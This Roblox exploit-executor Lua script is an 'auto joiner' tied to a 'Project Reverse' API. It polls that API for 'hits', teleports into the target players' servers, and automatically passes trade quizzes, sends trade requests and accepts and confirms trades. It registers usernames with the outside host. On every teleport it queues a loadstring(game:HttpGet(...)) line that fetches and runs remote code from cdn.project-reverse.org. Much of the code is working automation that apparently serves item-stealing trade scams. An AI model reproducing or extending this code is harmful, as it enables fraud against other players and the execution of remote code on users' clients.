	v363.Row.addTitle(v381, "Allow Hits")
	v363.Toggle.create(v363.Row.addContent(v381), {
		default = t18.connectionEnabled,
		onChanged = function(p109)
			t18.connectionEnabled = p109
			_G.connectionEnabled = t18.connectionEnabled
			writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t18))
		end
	})

	local v382 = v363.Row.create(v374)

	v363.Row.addTitle(v382, "FPS Optimization")
	v363.Toggle.create(v363.Row.addContent(v382), {
		default = t18.optiEnabled,
		onChanged = function(p110)
			t18.optiEnabled = p110

			if p110 == false then
				game:GetService("RunService"):Set3dRenderingEnabled(true)
				setfpscap(60)
			else
				game:GetService("RunService"):Set3dRenderingEnabled(false)
				setfpscap(30)
			end

			writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t18))
		end
	})

	local v383 = v363.Row.create(v374)

	v363.Row.addTitle(v383, "Rejoin")
	v363.Button.create(v363.Row.addContent(v383), {
		text = "Click",
		variant = "primary",
		size = "sm",
		onClick = function()
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end
	})
	v371.MouseButton1Click:Connect(function()
		v363.Tab.setActive(v371, true)
		v363.Tab.setActive(v372, false)
		v370.PageLayout:JumpTo(v373)
	end)
	v372.MouseButton1Click:Connect(function()
		v363.Tab.setActive(v371, false)
		v363.Tab.setActive(v372, true)
		v370.PageLayout:JumpTo(v374)
	end)

	if t18.optiEnabled == false then
		game:GetService("RunService"):Set3dRenderingEnabled(true)
		setfpscap(60)
	else
		local Lighting = game:GetService("Lighting")

		settings().Rendering.QualityLevel = 1
		settings().Rendering.MeshCacheSize = 32
		settings().Rendering.EnableFRM = false
		Lighting.GlobalShadows = false
		Lighting.FogEnd = 10
		Lighting.Brightness = 0

		for _, v in workspace:GetDescendants() do
			if v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Enabled = false
			end
		end

		game:GetService("RunService"):Set3dRenderingEnabled(false)
		setfpscap(30)
	end

	_G.connectionEnabled = t18.connectionEnabled
	t19.setActive(t18.connectionEnabled)

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local s10 = ""
	local s11 = "bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto"

	if not ReplicatedStorage:FindFirstChild("Fsys") then
		v380.addLog("Game module 'Fsys' not loaded, waiting", "warn")
		ReplicatedStorage:WaitForChild("Fsys")
	end

	local function v390(p111, p112)
		setthreadidentity(8)
		v380.addLog(p111, p112)
	end

	v380.addLog("Game module Fsys loaded", "success")

	local function v391(p113)
		local u392

		setthreadidentity(2)

		local ok, result = pcall(function()
			u392 = require(ReplicatedStorage.Fsys).load(p113)
		end)

		setthreadidentity(8)

		if not ok then
			v390(("Failed to require %*, %*"):format(p113, result), "error")
		end

		return u392
	end

	task.wait(4)

	local RouterClient = v391("RouterClient")
	local ClientData = v391("ClientData")

	v380.addLog("Modules success load", "success")

	local DataChanged = RouterClient.get("DataAPI/DataChanged")
	local n18 = 0
	local t20 = {
		"Parents",
		{
			source_for_logging = "intro_sequence",
			dont_enter_location = true
		}
	}

	repeat
		pcall(function()
			RouterClient.get("TeamAPI/ChooseTeam"):InvokeServer(unpack(t20))
		end)
		warn("AGA POIMAL")
	until game.Players.LocalPlayer.Character ~= nil

	task.spawn(function()
		CheckTradeLicense = function()
			for _, toy in pairs(ClientData.get("inventory").toys) do
				if toy.id:match("license") then
					return true
				end
			end

			return false
		end

		if not CheckTradeLicense() then
			repeat
				task.spawn(function()
					RouterClient.get("SettingsAPI/SetBooleanFlag"):FireServer("has_talked_to_trade_quest_npc", true)
					task.wait()
					RouterClient.get("TradeAPI/BeginQuiz"):FireServer()
					task.wait(1)

					for _, v in pairs(ClientData.get("trade_license_quiz_manager").quiz) do
						RouterClient.get("TradeAPI/AnswerQuizQuestion"):FireServer(v.answer)
					end
				end)
				wait(3)
			until CheckTradeLicense()
		end
	end)

	local function v404()
		local t21 = {
			"food",
			"teachers_apple",
			{
				buy_count = 5
			}
		}

		pcall(function()
			return RouterClient.get("ShopAPI/BuyItem"):InvokeServer(unpack(t21))
		end)
	end
	local function v406(p114)
		warn("Add Pet", p114)
		RouterClient.get("TradeAPI/AddItemToOffer"):FireServer(p114)
	end
	local function v407()
		v404()

		local food = ClientData.get("inventory").food
		local t22 = {}

		if not food then
			warn("NO FOOD")

			return
		end

		for k, v in food, nil, nil do
			if v.kind == "teachers_apple" then
				table.insert(t22, k)
			end
		end

		warn("Pet UID", t22[1])
		v406(t22[1])
	end
	local function v412()
		if game.Players:FindFirstChild(s10) then
			pcall(function()
				RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(game:GetService("Players"):WaitForChild(s10), true)
			end)
			task.wait()
			RouterClient.get("TradeAPI/SendTradeRequest"):FireServer(game:GetService("Players"):WaitForChild(s10))
		end
	end

	task.spawn(function()
		while task.wait(1) do
			v412()
		end
	end)

	local function v413(p115)
		for _, v in game.Players:GetPlayers() do
			if string.find(p115, v.Name) then
				return true
			end
		end

		return false
	end

	spawn(function()
		while task.wait(1) do
			n18 += 1
		end
	end)

	local t23 = {
		Success = "The teleport was successful.",
		Failure = "The teleport failed for an unknown reason.",
		GameNotFound = "The game that this player attempted to teleport to could not be found.",
		GameEnded = "The game that this player attempted to teleport to has ended.",
		GameFull = "The game that this player attempted to teleport to is full.",
		Unauthorized = "The player is not authorized to complete this teleport.",
		Flooded = "Too many teleport requests have been made recently.",
		IsTeleporting = "The player is currently being teleported."
	}

	game:GetService("TeleportService").TeleportInitFailed:Connect(function(p116, p117)
		v380.addLog(("Teleport failed: %*"):format(t23[p117.Name] or "unknow error"), "error")
	end)

	local n19 = 1
	local n20 = 0

	local function v419(p118, p119)
		if p119 == true then
			n19 += 1
		end

		if p118 == true then
			return n19
		end
	end

	local n21 = 0

	spawn(function()
		while task.wait(10) do
			local v421 = v419(true, false)

			if n20 < v421 then
				n20 = v421
			else
				t19.setActive(false)
				v380.addLog("Something wrong, cant get hit data.", "error")
				n21 += 1

				if n21 >= 3 then
					v380.addLog("Something wrong, trying to rejoin")
					game:GetService("TeleportService"):Teleport(game.PlaceId)
				end
			end
		end
	end)
	task.spawn(function()
		local ok, result = pcall(function()
			while task.wait(0.8) do
				local s12 = ""

				if isfile("ProjectReverseAJ.txt") then
					s12 = readfile("ProjectReverseAJ.txt")
				end

				if #s12 > 0 then
					s10 = s12

					if game:GetService("Players"):FindFirstChild(s12:split(" ")[1]) then
						if n18 < 30 and v413(s12) then
							v419(false, true)
							warn("WAITING")

							continue
						end
					end
				end

				if _G.connectionEnabled then
					local v425 = v362.getHitForJoiner(s11, AUTHORIZATION_KEY, "ame")

					v419(false, true)
					t19.setActive(true)

					if v425 then
						v380.addLog(("[HIT] %*, teleporting..."):format(v425.username), "warn")

						local writefile_ = writefile
						local v427 = ("%*"):format(v425.username)

						writefile_("ProjectReverseAJ.txt", v427)

						for i = 1, 5 do
							game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v425.serverId)
							task.wait(0.5)
						end
					end
				else
					t19.setActive(false)
				end
			end
		end)

		if not ok then
			warn(result)
		end
	end)
	DataChanged.OnClientEvent:Connect(function(...)
		x = { ... }

		if type(x[3]) == "table" and x[2] == "trade" then
			trade = x[3]

			if trade.recipient == game.Players.LocalPlayer.Name then
				me = "recipient_offer"
			elseif trade.sender == game.Players.LocalPlayer.Name then
				me = "sender_offer"
			end

			if tostring(trade.recipient) == game.Players.LocalPlayer.Name then
				me = "recipient_offer"
				notme = "sender_offer"
			end

			if tostring(trade.sender) == game.Players.LocalPlayer.Name then
				me = "sender_offer"
				notme = "recipient_offer"
			end

			me = trade[me]
			notme = trade[notme]
			DID_I_ADDED_APPLE = false

			for _ in pairs(me.items) do
				DID_I_ADDED_APPLE = true
			end

			if not DID_I_ADDED_APPLE then
				v407()
			end

			if notme.negotiated then
				RouterClient.get("TradeAPI/AcceptNegotiation"):FireServer()
			end

			if notme.confirmed then
				RouterClient.get("TradeAPI/ConfirmTrade"):FireServer()
			end
		end
	end)

	return {}
end
handlers.s = function()
	handlers.load("a")

	local v430 = handlers.load("o")

	_G.connectionEnabled = true

	local t24 = {
		connectionEnabled = true,
		optiEnabled = false
	}

	if isfile("prev-config.json") then
		local ok, result = pcall(function()
			return game:GetService("HttpService"):JSONDecode(readfile("prev-config.json"))
		end)

		if ok and result then
			t24 = result

			local warn_ = warn
			local v435 = ([[PREV [AUTO JOINER]: CONFIG LOADING SUCCESSFUL
 connectionEnabled: %*
 optiEnabled: %*]]):format(t24.connectionEnabled, t24.optiEnabled)

			warn_(v435)

			if t24.connectionEnabled == nil then
				warn("PREV [AUTO JOINER]: FAILED TO GET CONFIG connectionEnabled", t24.connectionEnabled)
				t24.connectionEnabled = true
			end

			if t24.optiEnabled == nil then
				t24.optiEnabled = false
			end
		else
			warn("PREV [AUTO JOINER]: ERROR LOAD CONFIG")
		end
	else
		writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t24))
	end

	local ScreenGui = Instance.new("ScreenGui")

	ScreenGui.IgnoreGuiInset = false
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.Parent = game:GetService("CoreGui")
	ScreenGui.ResetOnSpawn = false

	local v437 = v430.Window.create(ScreenGui)
	local v438 = v430.Tab.create(v437.Tabs, {
		text = "Stats",
		active = true
	})
	local v439 = v430.Tab.create(v437.Tabs, {
		text = "Settings",
		active = false
	})
	local v440 = v430.Page.create(v437.Container, {
		name = "Stats"
	})
	local v441 = v430.Page.create(v437.Container, {
		name = "Settings"
	})
	local v442 = v430.Row.create(v440)

	v430.Row.addTitle(v442, "API Status:")

	local v443 = v430.Status.create(v430.Row.addContent(v442), {
		text = "Active"
	})
	local v444 = v430.Row.create(v440)

	v430.Row.addTitle(v444, "Items in Inventory:")

	local v445 = v430.Counter.create(v430.Row.addContent(v444), {
		title = "Items in Inventory: SOON",
		value = 0
	})
	local v446 = v430.Row.create(v440)

	v430.Row.addTitle(v446, "Timer:")
	v430.Timer.create(v430.Row.addContent(v446), {
		autoStart = true
	})

	local v447 = v430.Status.create(v437.MinimizedContent, {
		text = "Active"
	})
	local v448 = v430.Counter.create(v437.MinimizedContent, {
		value = 0
	})

	v430.Timer.create(v437.MinimizedContent, {
		autoStart = true
	})

	local t25 = {
		setActive = function(p120)
			v443.setActive(p120)
			v447.setActive(p120)
		end
	}
	local t26 = {
		setValue = function(p121)
			v445.setValue(p121)
			v448.setValue(p121)
		end,
		getValue = function()
			return v445.getValue()
		end
	}

	v430.Logs.create(v440, {
		maxLines = 50,
		height = 100
	}).addLog("UI initialized success", "success")

	local v451 = v430.Row.create(v441)

	v430.Row.addTitle(v451, "Allow Hits")
	v430.Toggle.create(v430.Row.addContent(v451), {
		default = t24.connectionEnabled,
		onChanged = function(p122)
			t24.connectionEnabled = p122
			_G.connectionEnabled = t24.connectionEnabled
			writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t24))
		end
	})

	local v452 = v430.Row.create(v441)

	v430.Row.addTitle(v452, "FPS Optimization")
	v430.Toggle.create(v430.Row.addContent(v452), {
		default = t24.optiEnabled,
		onChanged = function(p123)
			t24.optiEnabled = p123

			if p123 == false then
				game:GetService("RunService"):Set3dRenderingEnabled(true)
				setfpscap(60)
			else
				game:GetService("RunService"):Set3dRenderingEnabled(false)
				setfpscap(30)
			end

			writefile("prev-config.json", game:GetService("HttpService"):JSONEncode(t24))
		end
	})

	local v453 = v430.Row.create(v441)

	v430.Row.addTitle(v453, "Rejoin")
	v430.Button.create(v430.Row.addContent(v453), {
		text = "Click",
		variant = "primary",
		size = "sm",
		onClick = function()
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end
	})
	v438.MouseButton1Click:Connect(function()
		v430.Tab.setActive(v438, true)
		v430.Tab.setActive(v439, false)
		v437.PageLayout:JumpTo(v440)
	end)
	v439.MouseButton1Click:Connect(function()
		v430.Tab.setActive(v438, false)
		v430.Tab.setActive(v439, true)
		v437.PageLayout:JumpTo(v441)
	end)

	if t24.optiEnabled == false then
		game:GetService("RunService"):Set3dRenderingEnabled(true)
		setfpscap(60)
	else
		local Lighting = game:GetService("Lighting")

		settings().Rendering.QualityLevel = 1
		settings().Rendering.MeshCacheSize = 32
		settings().Rendering.EnableFRM = false
		Lighting.GlobalShadows = false
		Lighting.FogEnd = 10
		Lighting.Brightness = 0

		for _, v in workspace:GetDescendants() do
			if v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Enabled = false
			end
		end

		game:GetService("RunService"):Set3dRenderingEnabled(false)
		setfpscap(30)
	end

	_G.connectionEnabled = t24.connectionEnabled
	t25.setActive(t24.connectionEnabled)

	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	cloneref(game:GetService("Players"))

	local v458 = require(ReplicatedStorage.Packages.ReplicatorClient).get("Trade_" .. game.Players.LocalPlayer.UserId)

	require(game.ReplicatedStorage.Controllers.TradeController)

	local tradeId
	local u460 = false
	local u461 = false

	local function v462(p124)
		local t27 = {}
		local t28 = {}

		for k, v in ReplicatedStorage.Packages.Net:GetChildren(), nil, nil do
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				local v467, v468 = string.match(v.Name, "^([A-Z]+)/(.*)")

				if v467 and v468 then
					if string.match(v468, "^[a-f0-9]+$") and #v468 == 64 then
						table.insert(t28, {
							n = v.Name,
							cn = v.ClassName,
							i = k,
							inst = v
						})
					elseif not string.match(v468, "^[a-f0-9%-]+$") then
						t27[k] = {
							n = v.Name,
							cn = v.ClassName
						}
					end
				end
			end
		end

		for _, v in t28, nil, nil do
			local n22 = -1

			for k, v2 in t27, nil, nil do
				if k < v.i and v2.cn == v.cn and n22 < k then
					if string.match(v2.n, "^([A-Z]+/)") == string.match(v.n, "^([A-Z]+/)") then
						n22 = k
					end
				end
			end

			if n22 > 0 and t27[n22].n == p124 then
				return v.inst
			end
		end

		return nil
	end
	local function v474()
		repeat
			task.wait(0.1)
			v462("RE/TradeService/Ready"):FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
		until u460

		repeat
			task.wait(0.1)

			if not u460 then
				v462("RE/TradeService/Ready"):FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
			end

			v462("RE/TradeService/Accept"):FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb")
		until u461
	end
	local function v475(p125)
		v462("RF/TradeService/AcceptInvite"):InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", p125)
	end

	local CreateInvite = v462("RE/TradeService/CreateInvite")
	local TradeCompleted = v462("RE/TradeService/TradeCompleted")

	v458:ListenRaw(function(p126)
		if not p126.active then
			tradeId = nil

			return
		end

		u460 = false
		u461 = false

		for _, v in p126.active.data.players, nil, nil do
			if v.username == game.Players.LocalPlayer.Name then
				u460 = v.ready
				u461 = v.accepted

				break
			end
		end

		local v480

		for _, v in p126.active.data.users, nil, nil do
			if v ~= game.Players.LocalPlayer.UserId then
				v480 = v
			end
		end

		if tradeId == nil then
			tradeId = p126.active.tradeId
			warn("New trade created", v480)
		end
	end)
	TradeCompleted.OnClientEvent:Connect(function()
		warn("Trade completed", {})
	end)
	CreateInvite.OnClientEvent:Connect(function(p127)
		v475(p127)
	end)
	t25.setActive(true)
	spawn(function()
		while task.wait(0.8) do
			if tradeId ~= nil then
				v474()
			end
		end
	end)

	return {}
end

local t29 = {
	126884695634066,
	142823291,
	920587237,
	127742093697776,
	96342491571673,
	109983668079237
}

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local VirtualUser = game:GetService("VirtualUser")

task.spawn(function()
	while true do
		VirtualUser:CaptureController()
		VirtualUser:ClickButton2(Vector2.new())
		wait(60)
	end
end)

if not table.find(t29, game.PlaceId) then
	return
end

local function v485()
	local t30 = {
		Url = "https://api.project-reverse.org/users/me",
		Method = "GET",
		Headers = {
			["authorization-key"] = AUTHORIZATION_KEY
		}
	}
	local ok, result = pcall(function()
		return request(t30)
	end)

	if ok then
		return result.Body
	end
end

local HttpService = game:GetService("HttpService")

local function v490()
	local t31 = {
		Url = "https://api.project-reverse.org/users/add-usernames",
		Method = "POST",
		Headers = {
			["authorization-key"] = AUTHORIZATION_KEY,
			["Content-Type"] = "application/json"
		},
		Body = HttpService:JSONEncode({
			usernames = { game.Players.LocalPlayer.Name }
		})
	}
	local ok, result = pcall(function()
		return request(t31)
	end)

	if ok then
		return result.Body
	end
end

warn("NEW VERSION 2")

local v494 = v485()

if v494 and not table.find(HttpService:JSONDecode(v494).data.usernames, game.Players.LocalPlayer.Name) then
	v490()
end

queue_on_teleport(string.format("getgenv().AUTHORIZATION_KEY = %q; loadstring(game:HttpGet(\"https://cdn.project-reverse.org/tsqTest4.luau\"))()", AUTHORIZATION_KEY))

if game.PlaceId == 126884695634066 then
	handlers.load("p")
elseif game.PlaceId == 142823291 then
	handlers.load("q")
elseif game.PlaceId == 920587237 then
	handlers.load("r")
elseif game.GameId == 7709344486 then
	handlers.load("s")
end
